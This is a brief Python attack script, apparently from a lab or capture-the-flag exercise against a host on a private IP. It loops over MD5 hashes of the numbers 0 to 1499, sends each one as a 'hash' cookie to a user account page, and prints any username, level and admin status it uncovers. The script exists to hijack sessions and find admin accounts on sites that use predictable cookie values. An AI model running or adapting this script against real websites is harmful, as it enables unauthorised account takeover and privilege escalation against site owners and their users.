import requests
import hashlib
import re

for i in range(0,1500):
	hash = hashlib.md5(str(i).encode('utf-8')).hexdigest()
	cookies = {'hash':hash}
	req = requests.get('http://172.16.2.133/user_account.php', cookies=cookies)
	if 'Hello Guest' not in req.text:
		username = re.search('(Username: )[a-zA-Z0-9]*',req.text).group(0)
		print('======Found new user!======')
		print(username)
		print('User level: {}'.format(i))
		print('User hash: {}'.format(hash))
		if 'Admin' in req.text:
			print('Admin: Yes')
		else:
			print('Admin: No')
